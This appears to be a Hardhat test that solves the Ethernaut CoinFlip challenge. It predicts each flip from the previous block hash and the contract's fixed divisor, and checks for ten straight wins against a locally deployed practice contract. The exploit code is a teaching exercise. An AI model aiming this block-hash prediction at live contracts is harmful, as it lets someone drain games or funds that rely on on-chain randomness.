import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { CoinFlip } from "typechain-types";

// Challenge description

// This is a coin flipping game where you need to build up your
// winning streak by guessing the outcome of a coin flip.
// To complete this level you'll need to use your psychic
// abilities to guess the correct outcome 10 times in a row.

describe("Ethernaut - CoinFlip", async () => {
  let coinflip: CoinFlip;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    coinflip = await ethers
      .getContractFactory("CoinFlip", owner)
      .then((f) => f.deploy());
  });

  it("Hacks", async () => {
    const factor = ethers.BigNumber.from(
      "57896044618658097711785492504343953926634992332820282019728792003956564819968",
    );

    for (let i = 1; i <= 10; i++) {
      const blockHashNumber = await ethers.provider
        .getBlockNumber()
        .then(ethers.provider.getBlock)
        .then((b) => ethers.BigNumber.from(b.hash));
      const side = blockHashNumber.div(factor);
      await coinflip.connect(attacker).flip(side.eq(1));
    }

    expect(await coinflip.consecutiveWins()).equal(10);
  });
});
